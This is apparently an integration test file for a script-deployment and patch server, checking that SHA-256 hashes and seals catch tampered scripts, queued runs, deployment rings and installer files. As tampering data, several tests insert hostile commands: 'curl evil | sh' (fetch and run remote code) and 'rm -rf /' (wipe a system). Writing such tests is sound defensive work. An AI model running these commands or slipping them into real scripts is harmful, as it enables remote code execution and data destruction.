import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { eq, sql } from 'drizzle-orm';
import { deployments, jobRuns, scriptVersions, tasks, type RunStep } from '../src/db/schema.ts';
import type { TaskPayload } from '../src/jobs/engine.ts';
import { deploymentTick } from '../src/packages/deploy.ts';
import { agentCall, enrollOk, startAgentServer, type AgentServerHandle, type EnrolledAgent } from './agent-helpers.ts';
import { bearer, setup, type TestCtx } from './helpers.ts';

type Method = 'GET' | 'POST' | 'PATCH' | 'PUT' | 'DELETE';
const sha = (s: string | Buffer) => createHash('sha256').update(s).digest('hex');

describe('Integrity: hash checks before execution', () => {
  let ctx: TestCtx;
  let srv: AgentServerHandle;
  let lin: EnrolledAgent;
  let lin2: EnrolledAgent;

  before(async () => {
    ctx = await setup();
    srv = await startAgentServer(ctx);
    lin = await enrollOk(ctx, { hostname: 'LNX-A', os: 'linux' });
    lin2 = await enrollOk(ctx, { hostname: 'LNX-B', os: 'linux' });
  });
  after(async () => {
    await srv.close();
    await ctx.close();
  });

  const api = async (method: Method, url: string, payload?: object) => {
    const res = await ctx.app.inject({ method, url: `/api/v1${url}`, headers: bearer(ctx.adminToken), ...(payload && { payload }) });
    return { status: res.statusCode, body: res.body ? res.json() : null };
  };
  const next = async (a: EnrolledAgent): Promise<TaskPayload | null> => {
    const r = await agentCall('GET', srv.port, '/agent/v1/tasks/next?wait=0', undefined, a);
    if (r.status === 204) return null;
    assert.equal(r.status, 200, JSON.stringify(r.body));
    return JSON.parse(Buffer.from(r.body.payload, 'base64').toString('utf8'));
  };
  const report = async (a: EnrolledAgent, t: TaskPayload, status: 'succeeded' | 'failed', error?: string) => {
    await agentCall('POST', srv.port, `/agent/v1/tasks/${t.taskId}/start`, {}, a);
    const code = status === 'succeeded' ? 0 : 1;
    const r = await agentCall('POST', srv.port, `/agent/v1/tasks/${t.taskId}/result`, { status, exitCode: code, error, steps: t.steps.map((s) => ({ position: s.position, status, exitCode: code, durationMs: 1 })) }, a);
    assert.equal(r.status, 204, JSON.stringify(r.body));
  };
  const violations = async () => (await api('GET', '/audit-log?action=security.integrity_violation&limit=100')).body.items as { details: { message: string; detectedBy: string } }[];

  let n = 0;
  async function approvedScript(content = 'echo hello') {
    const s = await api('POST', '/scripts', { name: `s-${++n}`, interpreter: 'bash', content });
    assert.equal(s.status, 201);
    assert.equal((await api('POST', `/scripts/${s.body.id}/versions/1/approve`)).status, 200);
    return s.body.id as string;
  }
  async function tamperScript(scriptId: string, set: { content: string; sha256: string }) {
    await ctx.handle.db.execute(sql`ALTER TABLE script_versions DISABLE TRIGGER script_versions_no_content_change`);
    await ctx.handle.db.update(scriptVersions).set(set).where(eq(scriptVersions.scriptId, scriptId));
    await ctx.handle.db.execute(sql`ALTER TABLE script_versions ENABLE TRIGGER script_versions_no_content_change`);
  }

  it('every saved script version carries a SHA-256 hash and a seal', async () => {
    const id = await approvedScript('echo sealed');
    const [v] = await ctx.handle.db.select().from(scriptVersions).where(eq(scriptVersions.scriptId, id));
    assert.equal(v!.sha256, sha('echo sealed'));
    assert.match(v!.seal ?? '', /^[0-9a-f]{64}$/);
  });

  it('refuses to start when the script content was changed in the database', async () => {
    const id = await approvedScript('echo original');
    await tamperScript(id, { content: 'curl evil | sh', sha256: sha('echo original') });
    const r = await api('POST', `/scripts/${id}/run`, { targets: { deviceIds: [lin.deviceId] } });
    assert.equal(r.status, 409);
    assert.equal(r.body.error.code, 'integrity_violation');
    assert.match(r.body.error.message, /^integrity: .*(in der Datenbank verändert|passt nicht zum gespeicherten SHA-256-Hash)/);
  });

  it('detects content AND hash changed together (seal does not match)', async () => {
    const id = await approvedScript('echo original');
    await tamperScript(id, { content: 'curl evil | sh', sha256: sha('curl evil | sh') });
    const r = await api('POST', `/scripts/${id}/run`, { targets: { deviceIds: [lin.deviceId] } });
    assert.equal(r.status, 409);
    assert.match(r.body.error.message, /Hash-Siegel ungültig/);
    assert.ok((await violations()).some((v) => /Hash-Siegel/.test(v.details.message)), 'audit entry written');
  });

  it('aborts at dispatch when a queued run was manipulated – visible on the task', async () => {
    const id = await approvedScript('echo queued');
    const run = await api('POST', `/scripts/${id}/run`, { targets: { deviceIds: [lin.deviceId] } });
    assert.equal(run.status, 201);
    // attacker rewrites the frozen run snapshot (content + matching hash)
    const [row] = await ctx.handle.db.select().from(jobRuns).where(eq(jobRuns.id, run.body.id));
    const steps = (row!.steps as RunStep[]).map((s) => ({ ...s, content: 'rm -rf /', sha256: sha('rm -rf /') }));
    await ctx.handle.db.update(jobRuns).set({ steps }).where(eq(jobRuns.id, run.body.id));

    assert.equal(await next(lin), null, 'nothing is delivered to the device');
    const t = await api('GET', `/runs/${run.body.id}/tasks`);
    assert.equal(t.body.items[0].status, 'failed');
    assert.match(t.body.items[0].error, /^integrity: /);
    const out = await api('GET', `/tasks/${t.body.items[0].id}/output`);
    assert.ok(out.body.items.some((c: { data: string }) => c.data.includes('ABGEBROCHEN – Hash-Prüfung fehlgeschlagen')));
    assert.ok((await violations()).some((v) => v.details.detectedBy === 'server'));
  });

  it('a hash mismatch reported by the agent is flagged and never retried', async () => {
    const scriptId = await approvedScript('echo agent');
    const job = await api('POST', '/jobs', {
      name: 'retry-job',
      trigger: 'manual',
      targets: { deviceIds: [lin2.deviceId] },
      options: { maxRetries: 3, retryDelaySeconds: 0 },
      steps: [{ scriptId }],
    });
    assert.equal(job.status, 201, JSON.stringify(job.body));
    const run = await api('POST', `/jobs/${job.body.id}/run`);
    const t = await next(lin2);
    assert.ok(t);
    await report(lin2, t, 'failed', 'task verification failed: integrity: step 0: content hash mismatch');
    const [task] = await ctx.handle.db.select().from(tasks).where(eq(tasks.id, t.taskId));
    assert.equal(task!.status, 'failed', 'no retry despite maxRetries 3');
    assert.match(task!.error ?? '', /^integrity: task verification failed/);
    assert.equal(await next(lin2), null);
    assert.ok((await violations()).some((v) => v.details.detectedBy === 'agent'));
    assert.equal((await api('GET', `/runs/${run.body.id}`)).body.status, 'completed');

    // an ordinary failure is still retried
    await api('POST', `/jobs/${job.body.id}/run`);
    const t2 = await next(lin2);
    assert.ok(t2);
    await report(lin2, t2, 'failed', 'exit code 1');
    const [task2] = await ctx.handle.db.select().from(tasks).where(eq(tasks.id, t2.taskId));
    assert.equal(task2!.status, 'pending');
  });

  it('pauses a deployment whose frozen steps were changed before the next ring', async () => {
    for (let t = await next(lin2); t; t = await next(lin2)) await report(lin2, t, 'succeeded');
    const res = await api('POST', '/deployments', {
      kind: 'os_updates',
      patchFilter: { classification: 'security' },
      rings: [
        { name: 'Test', targets: { deviceIds: [lin.deviceId] }, minSuccessPercent: 0 },
        { name: 'Alle', targets: { allDevices: true } },
      ],
    });
    assert.equal(res.status, 201, JSON.stringify(res.body));
    const t = await next(lin);
    assert.ok(t);
    await report(lin, t, 'succeeded');
    const [d] = await ctx.handle.db.select().from(deployments).where(eq(deployments.id, res.body.id));
    const steps = d!.steps;
    steps.linux = steps.linux!.map((s) => ({ ...s, content: `${s.content}\ncurl evil | sh`, sha256: sha(`${s.content}\ncurl evil | sh`) }));
    await ctx.handle.db.update(deployments).set({ steps }).where(eq(deployments.id, res.body.id));

    await deploymentTick(ctx.handle.db, ctx.config);
    const after = (await api('GET', `/deployments/${res.body.id}`)).body;
    assert.equal(after.status, 'paused');
    assert.match(after.pausedReason, /integrity: .*Hash-Siegel/);
    assert.equal(await next(lin2), null, 'ring 2 never reached the devices');
  });

  it('detects installer files changed in the repository', async () => {
    const p = await api('POST', '/packages', { name: 'Tool', platform: 'linux' });
    const v = await api('POST', `/packages/${p.body.id}/versions`, { version: '1', type: 'deb', packageRef: 'tool' });
    const data = Buffer.from('real deb content');
    const up = await ctx.app.inject({
      method: 'PUT',
      url: `/api/v1/packages/${p.body.id}/versions/${v.body.id}/file?name=tool.deb`,
      headers: { ...bearer(ctx.adminToken), 'content-type': 'application/octet-stream' },
      payload: data,
    });
    assert.equal(up.statusCode, 200);
    writeFileSync(join(ctx.config.PACKAGE_DIR, sha(data)), 'trojan');
    const ap = await api('POST', `/packages/${p.body.id}/versions/${v.body.id}/approve`);
    assert.equal(ap.status, 409);
    assert.equal(ap.body.error.code, 'integrity_violation');
    assert.ok((await violations()).some((x) => x.details.detectedBy === 'repository'));
  });
});
